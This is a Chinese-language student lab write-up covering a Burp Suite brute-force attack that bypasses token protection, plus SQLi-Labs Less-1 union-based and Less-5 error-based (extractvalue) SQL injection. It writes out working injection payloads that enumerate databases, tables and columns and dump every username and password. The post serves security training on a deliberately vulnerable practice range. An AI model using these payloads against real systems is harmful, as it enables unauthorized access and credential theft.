---
title: "Web安全综合测试：Token防爆破与SQL注入（Less-1/Less-5）"
published: 2025-01-01
description: "综合测试Burp Suite Token防爆破绕过、SQLi-Labs Less-1联合查询注入与Less-5报错注入的完整操作流程。"
tags: ["SQL注入", "Token", "报错注入", "Union查询", "Burp Suite", "Web安全"]
category: "大三下实训"
---

Token防爆破：

随便输入用户名和密码，burp点击启动拦截，然后再提交登录。

![图片](./images/jr4_week4_img1.png)

![图片](./images/jr4_week4_img2.png)

添加字典符，切换攻击模式

![图片](./images/jr4_week4_img3.png)

![图片](./images/jr4_week4_img4.png)

![图片](./images/jr4_week4_img5.png)

选中token值之后记得复制一下，填入第6步的初始payload里面。

![图片](./images/jr4_week4_img6.png)

这里填写的token值是第5步里选中的token值！！

![图片](./images/jr4_week4_img7.png)

![图片](./images/jr4_week4_img8.png)

开始攻击

![图片](./images/jr4_week4_img9.png)

登录成功

![图片](./images/jr4_week4_img10.png)

SQL注入 Less-1：

进入靶场，发现没有任何输入框，只能从网址url框进行操作。首先要判断是有回显还是无回显。

![图片](./images/jr4_week4_img11.png)

尝试输入?id=1和?id=2，均有回显，发现能查询到对应id的用户名和密码，由此发现输入不同的id能查询到不同的账户和密码。

![图片](./images/jr4_week4_img12.png)

![图片](./images/jr4_week4_img13.png)

如果输入?id=-1，则没有任何回显，所以id输入非正数是错误的输入，得不到任何输出。由此可见，这一关属于有回显式

![图片](./images/jr4_week4_img14.png)

判断注入点类型—单引号测试

输入?id=1’

报错，属于字符型注入，SQL语法有错误！

![图片](./images/jr4_week4_img15.png)

在后面加上 --+，发现能正常回显用户名和密码

![图片](./images/jr4_week4_img16.png)

尝试id=1’ and 1=1 --+

![图片](./images/jr4_week4_img17.png)

尝试id=1’ and 1=2 --+，没有回显，验证出：若是数字不相等依然报错

![图片](./images/jr4_week4_img18.png)

判断字符数

用order by查询字段个数，从1开始，然后慢慢增加数字，直到报错

![图片](./images/jr4_week4_img19.png)

继续尝试order by 2和3，结果都和上图一样，正常

但当order by 4的时候，出现了报错，所以证明有3个字段

![图片](./images/jr4_week4_img20.png)

使用联合查询确定显示位置

Id=1’ union select 1,2,3 --+

![图片](./images/jr4_week4_img21.png)

因为查询语句前面是对的，所以显示前面的内容，后面的无法显示，不能确定显示的位置，所以用id=-1’这种错误的输入，来显示后面的内容，以确定显示的位置

![图片](./images/jr4_week4_img22.png)

成功确定显示位置！

查询数据库的名称

![图片](./images/jr4_week4_img23.png)

得到数据库库名为security

查询表名

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

![图片](./images/jr4_week4_img24.png)

查询到四个表名分别为emails、referers、uagents和users

查询users表的列名

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

![图片](./images/jr4_week4_img25.png)

查询所有的用户名和密码

?id=-1' union select 1,group_concat(username,'~',password),3 from users --+

![图片](./images/jr4_week4_img26.png)

SQL注入 less-5

判断是否存在SQL注入漏洞

?id=1

![图片](./images/jr4_week4_img27.png)

?id=-1

![图片](./images/jr4_week4_img28.png)

发现存在SQL注入

判断闭合方式

?id=1\

![图片](./images/jr4_week4_img29.png)

根据报错信息near ''1\' LIMIT 0,1'可知是’（单引号）闭合

判断字段数

?id=1' order by 3 --+

![图片](./images/jr4_week4_img30.png)

?id=1' order by 4 --+

![图片](./images/jr4_week4_img36.png)

根据报错信息可知，字段数为3

判断回显位置

?id=-1' union select 1,2,3 --+

![图片](./images/jr4_week4_img31.png)

发现没有显示报错位置，但在上一步判断字段数的时候有回显，所以可以选择基于报错注入

判断数据库名

?id=-1' and extractvalue(1,concat(0x7e,database())) --+

![图片](./images/jr4_week4_img32.png)

得到数据库名为security

判断表名

?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'))) --+

![图片](./images/jr4_week4_img33.png)

判断字段名

这里以users表为例

?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'))) --+

![图片](./images/jr4_week4_img34.png)

爆数据

?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(username,'-',password) from users))) --+

![图片](./images/jr4_week4_img35.png)
